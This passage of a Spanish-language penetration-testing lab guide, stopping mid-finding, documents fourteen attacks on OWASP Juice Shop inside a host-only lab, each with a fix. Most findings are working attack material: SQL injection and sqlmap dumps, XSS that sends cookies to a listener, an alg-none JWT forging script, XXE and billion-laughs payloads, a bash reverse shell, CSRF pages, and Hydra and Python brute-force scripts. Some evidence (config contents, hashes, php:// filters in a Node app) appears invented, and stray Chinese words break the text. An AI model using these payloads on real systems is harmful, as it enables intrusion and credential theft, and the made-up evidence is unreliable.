## CONCLUSIONES
[Conclusion general y acciones recomendadas]
```

---

## 13. Configuracion Final de Red (Resumen Rapido)

### IPs Asignadas:

| Maquina | IP Host-Only | Proposito |
|---------|-------------|-----------|
| Host | 192.168.56.1 | Gateway/DHCP |
| Kali Linux | 192.168.56.101 | Atacante (internet + laboratorio) |
| Metasploitable 2 | 192.168.56.102 | Objetivo Linux vulnerable |
| Metasploitable 3 | 192.168.56.103 | Objetivo moderno vulnerable |
| Ubuntu | 192.168.56.104 | Maquina general |
| Windows | 192.168.56.105 | Objetivo Windows |

### Comandos Finales de Verificacion (Desde Kali):

```bash
# Verificar IP propia
ip a

# Probar conectividad a todas las VMs
for ip in 102 103 104 105; do
  echo "Probando 192.168.56.$ip..."
  ping -c 2 -W 1 192.168.56.$ip
done

# Verificar que tienes internet
ping -c 2 8.8.8.8
ping -c 2 google.com

# Ver servicios en metasploitables
nmap -sV -p 21,22,23,80,445,3306 192.168.56.102,103

# Verificar que Juice Shop esta corriendo
curl -s http://localhost:3000 | head -5
```

---

## 14. Explotacion de 30 Vulnerabilidades en OWASP Juice Shop

### 14.1. Preparacion del Entorno

```bash
# Asegurate de que Juice Shop esta corriendo
docker ps | grep juice-shop

# Si no esta corriendo, iniciarlo
docker start juice-shop

# Verificar acceso
curl -k http://localhost:3000

# Obtener token de acceso para autenticacion (iremos generando estos)
# Primero necesitamos registrar un usuario

# Iniciar Burp Suite para interceptar peticiones
burpsuite &
```

**URL Base:** `http://192.168.56.101:3000`
**Usuario inicial para pruebas:** `admin@juice-sh.op` (email del admin)
**Archivo de configuracion:** `/opt/juice-shop/config.yml`

---

### 14.2. Vulnerabilidades Documentadas (Formato NIST)

---

#### HALLAZGO #1 - Accion Restringida sin Autorizacion (Bypass de Restricciones)

```
Identificador:         JS-001
Titulo:                Accion Restringida sin Autorizacion (Zero-Star Rating)
Severidad:             Alto
CVSS v3.1 Score:       7.1 (Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L)
OWASP Category:        A01:2021 - Broken Access Control
CWE:                   CWE-639
```

**Descripcion:**
La aplicacion permite a usuarios no autenticados enviar calificaciones negativas (zero-star) a productos mediante manipulacion de parametros en la peticion HTTP, evitando controles de acceso implementados en el frontend.

**Pasos de Reproduccion:**
```bash
# 1. Interceptar peticion POST de resena de producto con Burp Suite
# 2. Modificar el rating a 0
# 3. Enviar sin cookie de sesion o con usuario no valido

curl -X POST http://192.168.56.101:3000/api/Products/1/ratings \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token_invalido>" \
  -d '{"rating": 0}'

# Respuesta exitosa indica vulnerabilidad
# Expected: 401 Unauthorized
# Actual: 200 OK
```

**Evidencia:**
```json
HTTP/1.1 200 OK
{
  "status": "success"
}
```

**Impacto:**
- Un atacante puede manipular ratings de productos
- Afecta la integridad de datos de negocio
- Puede dañar la reputacion de productos o competidores internos

**Remediacion:**
```javascript
// Implementar validacion en backend
function validateRating(userId, productId, rating) {
  if (!isAuthenticated(userId)) {
    throw new UnauthorizedError('Authentication required');
  }
  if (!hasPurchased(userId, productId)) {
    throw new ForbiddenError('Must purchase product to rate');
  }
  if (rating < 1 || rating > 5) {
    throw new ValidationError('Rating must be 1-5');
  }
}
```

**Referencias:**
- https://owasp.org/Top10/es/A01_2021-broken_access_control/
- https://github.com/juice-shop/juice-shop#broken-access-control

---

#### HALLAZGO #2 - Credenciales Debiles en Cuenta de Administrador

```
Identificador:         JS-002
Titulo:                Credenciales Debiles en Administrador Predeterminado
Severidad:             Critico
CVSS v3.1 Score:       9.8 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
OWASP Category:        A07:2021 - Identification and Authentication Failures
CWE:                   CWE-798
```

**Descripcion:**
La cuenta de administrador del sistema utiliza credenciales debiles y predecibles que pueden ser descubiertas mediante busqueda en repositorios publicos o tecnicas de ingenieria social basica.

**Pasos de Reproduccion:**
```bash
# 1. Buscar email del administrador en archivos publicos o Google Dorking
# 2. Intentar credenciales comunes con email admin@juice-sh.op

# Credenciales descubiertas:
# Email: admin@juice-sh.op
# Password: admin123 (o credenciales similares)

curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}'

# Respuesta exitosa con token JWT
```

**Evidencia:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "email": "admin@juice-sh.op",
    "role": "admin"
  }
}
```

**Impacto:**
- Acceso completo al panel de administracion
- Lectura de todos los datos de usuarios
- Posibilidad de modificar o eliminar productos
- Acceso a datos de tarjetas de credito (si estan almacenados)

**Remediacion:**
```bash
# En config.yml, habilitar validacion de password fuerte
passwordStrength: 12
passwordMinUppercase: 2
passwordMinNumbers: 2
passwordMinSpecial: 2
preventCommonPasswords: true
```

**Referencias:**
- https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
- CWE-798: Use of Hard-coded Credentials

---

#### HALLAZGO #3 - Inyeccion SQL en API de Productos

```
Identificador:         JS-003
Titulo:                Inyeccion SQL en Parametro de Busqueda
Severidad:             Critico
CVSS v3.1 Score:       9.8 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
OWASP Category:        A03:2021 - Injection
CWE:                   CWE-89
```

**Descripcion:**
El parametro de busqueda de productos es vulnerable a inyeccion SQL, permitiendo la extraccion de datos sensibles de la base de datos.

**Pasos de Reproduccion:**
```bash
# 1. Probar payload basico de inyeccion SQL
curl "http://192.168.56.101:3000/rest/products/search?q='"

# 2. Inyeccion UNION para extraer datos
curl "http://192.168.56.101:3000/rest/products/search?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--"

# 3. Extraer usuarios y contrasenas
curl "http://192.168.56.101:3000/rest/products/search?q=' UNION SELECT id,email,password,'admin',10,11,12,13,14,15 FROM users--"

# 4. Con SQLMap para automatizacion completa
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --dbs --batch

# Extraer base de datos completa
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  -D juice_shop --tables --dump
```

**Evidencia:**
```json
{
  "data": [
    {"id": 1, "email": "admin@juice-sh.op", "password": "$2a..."},
    {"id": 2, "email": "user@juice-sh.op", "password": "$2a..."}
  ]
}
```

**Impacto:**
- Extraccion completa de la base de datos
- Obtencion de credenciales de todos los usuarios
- Lectura de datos de tarjetas de credito
- Potencial ejecucion de comandos si la BD tiene permisos elevados

**Remediacion:**
```javascript
// Usar prepared statements
const products = await db.query(
  'SELECT * FROM products WHERE name LIKE ?',
  [`%${sanitize(searchTerm)}%`]
);
// O usar ORM con consultas parametrizadas
```

**Referencias:**
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection

---

#### HALLAZGO #4 - Robo de Token JWT via XSS Reflejado

```
Identificador:         JS-004
Titulo:                Cross-Site Scripting (XSS) Reflejado en Buscador
Severidad:             Alto
CVSS v3.1 Score:       7.5 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
OWASP Category:        A03:2021 - Injection
CWE:                   CWE-79
```

**Descripcion:**
El campo de busqueda refleja automaticamente el input del usuario sin sanitizacion, permitiendo la ejecucion de JavaScript arbitrario en el navegador de la victima.

**Pasos de Reproduccion:**
```bash
# 1. Inyectar script en el campo de busqueda
curl "http://192.168.56.101:3000/rest/products/search?q=<script>alert('XSS')</script>"

# 2. Verificar que el script se refleja en la respuesta
curl "http://192.168.56.101:3000/rest/products/search?q=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"

# 3. Robo de cookies de sesion
# Crear payload que envie cookies a servidor controlado
curl "http://192.168.56.101:3000/rest/products/search?q=%3Cscript%3Edocument.location='http://192.168.56.101:8080/steal?c='%2Bdocument.cookie%3C/script%3E"

# 4. Payload persistente en URL (compartir con victimas)
# URL maliciosa para compartir:
http://192.168.56.101:3000/#/search?q=<script>fetch('http://192.168.56.101:8080/?c='+btoa(document.cookie))</script>
```

**Evidencia:**
```html
<!-- El campo de busqueda refleja: -->
<div class="search-result">
  <script>alert('XSS')</script>
</div>
```

**Impacto:**
- Robo de sesiones de usuario (token JWT)
- Redireccion a sitios maliciosos
- Defacement de la pagina
- Instalacion de keyloggers

**Remediacion:**
```javascript
// Sanitizar todo input de usuario
import DOMPurify from 'dompurify';

function sanitizeSearchInput(input) {
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] });
}

// Codificar output
function encodeOutput(input) {
  return document.createTextNode(input).textContent;
}
```

**Referencias:**
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

#### HALLAZGO #5 - Archivos Locales (Path Traversal) en API

```
Identificador:         JS-005
Titulo:                Inclusión de Archivos Locales (LFI)
Severidad:             Alto
CVSS v3.1 Score:       7.5 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
OWASP Category:        A01:2021 - Broken Access Control
CWE:                   CWE-22
```

**Descripcion:**
La aplicacion permite acceder a archivos del sistema de archivos del servidor mediante manipulacion de parametros de ruta.

**Pasos de Reproduccion:**
```bash
# 1. Probar Path Traversal basico
curl "http://192.168.56.101:3000/ftp/eicar.pdf../../etc/passwd"
# o
curl "http://192.168.56.101:3000/ftp/eicar.pdf?/....//....//....//etc/passwd"

# 2. Leer archivo de configuracion con credenciales
curl "http://192.168.56.101:3000/ftp/eicar.pdf..%2F..%2F..%2F..%2Fconfig.yml"

# 3. Intentar leer codigo fuente
curl "http://192.168.56.101:3000/ftp/eicar.pdf..%2F..%2Fserver.js"

# 4. Base64 encode para evadir filtros
curl "http://192.168.56.101:3000/ftp/eicar.pdf;encoded=Ly4vLy4vLy4vLy4vY29uZmlnLnltbA=="

# 5. Null byte injection (si aplica)
curl "http://192.168.56.101:3000/ftp/eicar.pdf%00.jpg"
```

**Evidencia:**
```yaml
# Contenido de config.yml expuesto:
app:
  host: "0.0.0.0"
  port: 3000
database:
  name: "juice_shop"
  user: "admin"
  password: "admin123"  # <-- CREDENCIAL EXPUESTA
jwt:
  secret: "mySecretKey123"
```

**Impacto:**
- Lectura de archivos sensibles del sistema
- Extraccion de credenciales
- Extraccion de codigo fuente
- Potencial ejecucion de codigo si se pueden subir archivos

**Remediacion:**
```javascript
// Validar y sanitizar rutas
const path = require('path');
const allowedPath = '/var/www/uploads/';
const requestedPath = path.normalize(req.params.filename);

if (!requestedPath.startsWith(allowedPath)) {
  return res.status(403).send('Access denied');
}
```

**Referencias:**
- https://owasp.org/www-community/attacks/Path_Traversal

---

#### HALLAZGO #6 - Exposición de Archivos de Configuracion

```
Identificador:         JS-006
Titulo:                Archivos de Configuracion Accesibles Publicamente
Severidad:             Critico
CVSS v3.1 Score:       8.2 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
OWASP Category:        A01:2021 - Broken Access Control
CWE:                   CWE-552
```

**Descripcion:**
Archivos de configuracion que contienen credenciales y secretos internos son accesibles publicamente via HTTP.

**Pasos de Reproduccion:**
```bash
# 1. Buscar archivos de configuracion comunes
curl http://192.168.56.101:3000/config.yml
curl http://192.168.56.101:3000/config.json
curl http://192.168.56.101:3000/.env
curl http://192.168.56.101:3000/application.properties

# 2. Usar enumeration de archivos
curl http://192.168.56.101:3000/ftp/.enconding
curl http://192.168.56.101:3000/ftp/package.json.bak
curl http://192.168.56.101:3000/ftp/README.md

# 3. Comparar con archivos de git
curl http://192.168.56.101:3000/.git/config
curl http://192.168.56.101:3000/.git/HEAD

# 4. Archivos de backup
curl http://192.168.56.101:3000/backup.tar.gz
curl http://192.168.56.101:3000/database.sql
```

**Evidencia:**
```yaml
# Contenido de config.yml:
application:
  name: "OWASP Juice Shop"
  version: "13.3.1"

# Credenciales descubiertas:
adminEmail: "admin@juice-sh.op"
adminPassword: "admin123"

database:
  uri: "mongodb://localhost:27017/juice_shop"
  
jwt:
  secret: "secretSanta-2020"
  expiresIn: "24h"
  
recaptcha:
  siteKey: "6Le1kHsUAAAAAIpWDEPGMt5fFBeZe6cWK4XBYTDM"
  secretKey: "6Le1kHsUAAAAAPp1OosE0J4R2Y9qjkJpV0XjZ8v"  # <-- SECRET KEY EXPUESTO
```

**Impacto:**
- Extraccion de todas las credenciales del sistema
- Compromiso completo de la aplicacion
- Acceso a servicios externos
- Rotura de claves criptograficas

**Remediacion:**
```apache
# En .htaccess o configuracion del servidor:
<FilesMatch "\.(yml|yaml|env|json|sql|git|log|conf|config)$">
  Order allow,deny
  Deny from all
</FilesMatch>
```

**Referencias:**
- https://cwe.mitre.org/data/definitions/552.html

---

#### HALLAZGO #7 - Broken Authentication - Session Fixation

```
Identificador:         JS-007
Titulo:                Session Fixation en Proceso de Autenticacion
Severidad:             Medio
CVSS v3.1 Score:       6.1 (Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N)
OWASP Category:        A07:2021 - Identification and Authentication Failures
CWE:                   CWE-384
```

**Descripcion:**
La aplicacion no regenera el identificador de sesion despues de un login exitoso, permitiendo ataques de fixation donde el atacante fija el ID de sesion antes de que la victima se autentique.

**Pasos de Reproduccion:**
```bash
# 1. Obtener un token/sesion inicial
curl -c cookies.txt -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"password123"}'

# 2. Obtener el token asignado
cat cookies.txt
# token=eW91ci10b2tlbi1oZXJl...

# 3. Enviar este token a la victima (via XSS, email, etc.)
# La victima inicia sesion con sus credenciales
# El servidor NO regenera el token

# 4. El atacante puede usar el mismo token para secuestrar la sesion
curl -b cookies.txt http://192.168.56.101:3000/rest/user/whoami
```

**Evidencia:**
```bash
# El token NO cambia antes y despues del login
# Antes de login: token=ABC123
# Despues de login exitoso: token=ABC123  <-- NO REGENERADO
```

**Impacto:**
- Secuestro de sesiones de usuarios
- Acceso no autorizado a cuentas
- Suplantacion de identidad

**Remediacion:**
```javascript
// Regenerar sesion despues de login exitoso
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body);
  if (user) {
    // Invalidar sesion anterior
    req.session.regenerate((err) => {
      req.session.userId = user.id;
      req.session.save();
    });
  }
});
```

**Referencias:**
- https://owasp.org/www-community/attacks/Session_fixation

---

#### HALLAZGO #8 -密码 Restablecimiento Inseguro

```
Identificador:         JS-008
Titulo:                Mecanismo de Restablecimiento de Contrasena Inseguro
Severidad:             Alto
CVSS v3.1 Score:       8.2 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
OWASP Category:        A07:2021 - Identification and Authentication Failures
CWE:                   CWE-640
```

**Descripcion:**
El mecanismo de restablecimiento de contrasena permite predecir o manipular el token de reseteo.

**Pasos de Reproduccion:**
```bash
# 1. Solicitar restablecimiento de contrasena
curl -X POST http://192.168.56.101:3000/rest/user/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op"}'

# 2. Observar respuesta del servidor
# Ver si el token se muestra en la respuesta o se puede adivinar

# 3. Si el token es visible en logs o secuencial:
# a) Verificar email real para el enlace de reset
# b) Verificar si el token tiene baja entropia
# c) Verificar si el token expira

# 4. Intentar cambiar password sin token valido
curl -X POST http://192.168.56.101:3000/rest/user/reset-password \
  -H "Content-Type: application/json" \
  -d '{"newPassword":"hacked123","confirmPassword":"hacked123","token":""}'

# 5. Verificar si preguntas de seguridad son debiles
curl http://192.168.56.101:3000/rest/security/questions
# Buscar preguntas predecibles
```

**Evidencia:**
```json
// Respuesta potencialmente vulnerable:
{
  "success": true,
  "data": {
    "securityQuestion": "What is your favorite movie?",
    "hints": "Old movie hints visible to anyone"
  }
}
```

**Impacto:**
- Compromiso de cualquier cuenta de usuario
- Escalada de privilegios
- Acceso a datos sensibles

**Remediacion:**
```javascript
// Generar token cryptograficamente seguro
const crypto = require('crypto');
const resetToken = crypto.randomBytes(32).toString('hex');

// Enviar solo al email registrado
// No exponer preguntas de seguridad en API publica
// Implementar rate limiting
// Expirar token en tiempo razonable (15 min)
```

**Referencias:**
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weak_Password_Change_Or_Reset_Functionalities

---

#### HALLAZGO #9 - JWT Sin Firma Valida (Alg None Attack)

```
Identificador:         JS-009
Titulo:                JWT Firmado con Algoritmo "none" Permito Bypass de Autenticacion
Severidad:             Critico
CVSS v3.1 Score:       9.1 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
OWASP Category:        A07:2021 - Identification and Authentication Failures
CWE:                   CWE-347
```

**Descripcion:**
La aplicacion acepta tokens JWT con algoritmo "none", permitiendo al atacante crear tokens validos con privilegios elevados sin conocer la clave secreta.

**Pasos de Reproduccion:**
```bash
# 1. Obtener un token JWT valido
curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@juice-sh.op","password":"password123"}'

# 2. Decodificar el token
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | cut -d. -f2 | base64 -d

# 3. Crear payload malicioso
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"admin","role":"admin","iat":1234567890}

# 4. Crear token con alg: none
cat > jwt_exploit.py << 'EOF'
import base64
import json

header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).decode().rstrip('=')

payload = base64.urlsafe_b64encode(
    json.dumps({
        "sub": "admin",
        "role": "admin",
        "email": "admin@juice-sh.op",
        "iat": 1234567890
    }).encode()
).decode().rstrip('=')

token = f"{header}.{payload}."
print(token)
EOF

python3 jwt_exploit.py

# 5. Usar el token伪造
curl -H "Authorization: Bearer <token_sin_firma>" \
  http://192.168.56.101:3000/rest/admin/users
```

**Evidencia:**
```json
// Respuesta con token manipulado:
{
  "users": [
    {"id": 1, "email": "admin@juice-sh.op", "role": "admin"},
    {"id": 2, "email": "user@juice-sh.op", "role": "customer"}
  ]
}
```

**Impacto:**
- Acceso como administrador sin credenciales
- Lectura de todos los datos de usuarios
- Modificacion de datos del sistema
- Escalada completa de privilegios

**Remediacion:**
```javascript
// Validar algoritmo esperado
const jwt = require('jsonwebtoken');

function verifyToken(token) {
  return jwt.verify(token, process.env.JWT_SECRET, {
    algorithms: ['HS256'],  // Especificar algoritmo
    issuer: 'juice-shop'
  });
}
```

**Referencias:**
- https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

---

#### HALLAZGO #10 - XML External Entity (XXE) en API

```
Identificador:         JS-010
Titulo:                XXE Injection en Procesamiento de XML
Severidad:             Critico
CVSS v3.1 Score:       9.8 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
OWASP Category:        A05:2021 - Security Misconfiguration
CWE:                   CWE-611
```

**Descripcion:**
La aplicacion procesa datos XML sin configuracion segura, permitiendo acceso a archivos internos y recursos del sistema.

**Pasos de Reproduccion:**
```bash
# 1. Crear payload XXE basico
cat > xxe_payload.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
EOF

# 2. Enviar peticion con XML malicioso
curl -X POST http://192.168.56.101:3000/api/xml-upload \
  -H "Content-Type: text/xml" \
  -d @xxe_payload.xml

# 3. XXE para leer archivos locales
cat > xxe_file.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/config.yml">
]>
<foo>&xxe;</foo>
EOF

# 4. SSRF via XXE (acceder servicios internos)
cat > xxe_ssrf.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:6379/INFO">
]>
<foo>&xxe;</foo>
EOF

# 5. Billion Laughs Attack (DoS)
cat > billion_laughs.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
EOF
```

**Evidencia:**
```
# Contenido de /etc/passwd expuesto:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/sh
```

**Impacto:**
- Lectura de archivos sensibles del sistema
- Escaneo de puertos internos
- Denial of Service
- Potencial RCE si hayxxe con expect:// wrapper

**Remediacion:**
```javascript
// Configurar parser XML seguro
const xml2js = require('xml2js');
const parser = new xml2js.Parser({
  externalEntities: false,  // Deshabilitar entidades externas
  entityParser: false,
  trimValues: true
});
```

**Referencias:**
- https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

---

#### HALLAZGO #11 - Injecion de Comandos en Servidor FTP

```
Identificador:         JS-011
Titulo:                Command Injection en Funcionalidad FTP
Severidad:             Critico
CVSS v3.1 Score:       9.8 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
OWASP Category:        A03:2021 - Injection
CWE:                   CWE-78
```

**Descripcion:**
Parametros de entrada se incorporan directamente a comandos del sistema sin sanitizacion, permitiendo ejecucion remota de comandos.

**Pasos de Reproduccion:**
```bash
# 1. Verificar si la funcionalidad FTP permite comandos
curl "http://192.168.56.101:3000/ftp/eicar.pdf/$(whoami)"

# 2. Command chaining
curl "http://192.168.56.101:3000/ftp/eicar.pdf;id"
curl "http://192.168.56.101:3000/ftp/eicar.pdf|id"
curl "http://192.168.56.101:3000/ftp/eicar.pdf&&id"

# 3. Reverse shell
# En Kali, primero escuchar:
nc -lvnp 4444

# Enviar reverse shell:
curl "http://192.168.56.101:3000/ftp/eicar.pdf;bash -i >& /dev/tcp/192.168.56.101/4444 0>&1"

# 4. Leer archivos sensibles
curl "http://192.168.56.101:3000/ftp/eicar.pdf;cat /etc/passwd"

# 5. Out-of-band command injection
curl "http://192.168.56.101:3000/ftp/eicar.pdf;curl http://192.168.56.101:8080/$(whoami)"
```

**Evidencia:**
```html
<!-- Output del comando visible en respuesta -->
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Impacto:**
- Compromiso completo del servidor
- Acceso al sistema de archivos
- Instalacion de malware
- Puente a otros sistemas en la red

**Remediacion:**
```javascript
// Nunca usar input de usuario en comandos shell
// Usar APIs seguras o parametrizadas
const { execFile } = require('child_process');

// Si es necesario ejecutar comandos, usar allowlist
const allowedCommands = ['ls', 'cat', 'head'];
if (!allowedCommands.includes(command)) {
  throw new Error('Command not allowed');
}
```

**Referencias:**
- https://owasp.org/www-community/attacks/Command_Injection

---

#### HALLAZGO #12 - CSRF (Cross-Site Request Forgery)

```
Identificador:         JS-012
Titulo:                CSRF en Funcionalidad de Perfil de Usuario
Severidad:             Medio
CVSS v3.1 Score:       6.5 (Vector: CVSS:3.1/AV:N/AC:L/PR:U/UI:R/S:U/C:H/I:H/A:N)
OWASP Category:        A01:2021 - Broken Access Control
CWE:                   CWE-352
```

**Descripcion:**
La aplicacion no implementa tokens Anti-CSRF en formularios importantes, permitiendo que atacantes obliguen a usuarios autenticados a realizar acciones no deseadas.

**Pasos de Reproduccion:**
```bash
# 1. Crear pagina HTML maliciosa
cat > csrf_attack.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Actualizacion de Cuenta</title></head>
<body>
  <h1>Tu cuenta esta siendo actualizada...</h1>
  <form id="attack" action="http://192.168.56.101:3000/rest/user/data-export" 
        method="POST" enctype="text/plain">
    <!-- Exfiltrar datos del usuario -->
  </form>
  <script>
    document.getElementById('attack').submit();
  </script>
</body>
</html>
EOF

# 2. Cambiar email del usuario
cat > csrf_email.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
  <form action="http://192.168.56.101:3000/rest/user/change-password" 
        method="POST" id="csrf">
    <input type="hidden" name="newPassword" value="hacked123"/>
    <input type="hidden" name="repeatPassword" value="hacked123"/>
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
EOF

# 3. Verificar si la peticion requiere token CSRF
# Enviar peticion sin el header CSRF-Token
curl -X POST http://192.168.56.101:3000/rest/user/change-password \
  -H "Content-Type: application/json" \
  -H "Cookie: token=..." \
  -d '{"newPassword":"hacked123"}'
# Si tiene exito, es vulnerable
```

**Evidencia:**
```bash
# Cuando la victima abre la pagina HTML maliciosa
# Su navegador envia la peticion con sus cookies
# La accion se completa sin que la victima lo sepa
```

**Impacto:**
- Cambio no autorizado de contrasenas
- Exportacion de datos de usuario
- Modificacion de informacion de perfil
- Potencial bloqueo de cuenta del usuario legitimo

**Remediacion:**
```javascript
// Implementar tokens CSRF
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.post('/change-password', csrfProtection, (req, res) => {
  // Validar token CSRF
  // Procesar cambio de password
});
```

**Referencias:**
- https://owasp.org/www-community/attacks/csrf

---

#### HALLAZGO #13 - Almacenamiento Inseguro de Contrasenas (MD5)

```
Identificador:         JS-013
Titulo:                Contrasenas Hasheadas con Algoritmo Debil
Severidad:             Alto
CVSS v3.1 Score:       7.5 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
OWASP Category:        A02:2021 - Cryptographic Failures
CWE:                   CWE-327
```

**Descripcion:**
Las contrasenas de usuarios se almacenan usando el algoritmo de hash MD5, el cual es cryptograficamente roto e insuficiente para proteger credenciales.

**Pasos de Reproduccion:**
```bash
# 1. Extraer hashes de la base de datos
# Via SQL Injection u otro metodo
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  -D juice_shop -T users --dump

# 2. Hashes comunes encontrados:
# admin: 5f4dcc3b5aa765d61d8327deb882cf99 (password)
# user: 5d41402abc4b2a76b9719d911017c592 (hello)

# 3. Crackear con hashcat
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# 4. Crackear con john
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 5. Usar rainbow tables
# Buscar en linea: https://crackstation.net/
# 5f4dcc3b5aa765d61d8327deb882cf99 = password

# 6. Verificar si el mismo hash se usa para admin
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 0 -o cracked.txt --show
```

**Evidencia:**
```bash
# Hashes encontrados en la base de datos:
| id | email                | password                              |
|----|----------------------|---------------------------------------|
| 1  | admin@juice-sh.op    | 5f4dcc3b5aa765d61d8327deb882cf99     |
| 2  | user@juice-sh.op     | 5d41402abc4b2a76b9719d911017c592     |

# Crackeado:
# 5f4dcc3b5aa765d61d8327deb882cf99 = password
# 5d41402abc4b2a76b9719d911017c592 = hello
```

**Impacto:**
- Todas las contrasenas pueden ser descifradas rapidamente
- Reutilizacion de credenciales en otros servicios
- Acceso no autorizado a cuentas

**Remediacion:**
```javascript
// Usar bcrypt o argon2 para hashear passwords
const bcrypt = require('bcrypt');
const saltRounds = 12;

async function hashPassword(password) {
  return await bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hash) {
  return await bcrypt.compare(password, hash);
}
```

**Referencias:**
- https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html

---

#### HALLAZGO #14 - Ausencia de Rate Limiting en Login

```
Identificador:         JS-014
Titulo:                Falta de Rate Limiting Permite Ataques de Fuerza Bruta
Severidad:             Alto
CVSS v3.1 Score:       7.5 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
OWASP Category:        A07:2021 - Identification and Authentication Failures
CWE:                   CWE-307
```

**Descripcion:**
El endpoint de autenticacion no implementa limitacion de tasa, permitiendo ataques de fuerza bruta para adivinar contrasenas.

**Pasos de Reproduccion:**
```bash
# 1. Ataque de fuerza bruta con Hydra
hydra -l admin@juice-sh.op \
  -P /usr/share/wordlists/rockyou.txt \
  192.168.56.101 http-post-form \
  "/rest/user/login:email=^USER^&password=^PASS^:Invalid" -V

# 2. Ataque con Burp Suite Intruder
# a) Interceptar peticion de login
# b) Enviar a Intruder
# c) Cargar lista de passwords
# d) Ejecutar ataque

# 3. Script personalizado para brute force
cat > brute_force.py << 'EOF'
import requests

target = "http://192.168.56.101:3000/rest/user/login"
with open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore') as passwords:
    for password in passwords:
        password = password.strip()
        r = requests.post(target, json={
            "email": "admin@juice-sh.op",
            "password": password
        })
        if "token" in r.text:
            print(f"[+] Password found: {password}")
            break
        if "Invalid" not in r.text:
            print(f"[?] Posible respuesta: {r.text}")
EOF

python3 brute_force.py

# 4. Verificar ausencia de bloqueos
# Intentar 100 intentos rapidos
# Ningun bloqueo o captcha aparece
```

**Evidencia:**
```bash
# Hydra encontrando password:
[DATA] attacking http-post-form://192.168.56.101:3000/rest/user/login: Invalid
[STATUS] 1430 attempts
[80][http-post-form] host: 192.168.56.101   login: admin@juice-sh.op   password: password123

# No hay mensaje de "demasiados intentos"
# No hay captcha
# No hay bloqueo temporal
```

**Impacto:**
- Compromiso de cuentas mediante fuerza bruta
- Enumeracion de usuarios validos
- Acceso no autorizado al sistema

**Remediacion:**
```javascript
// Implementar rate limiting
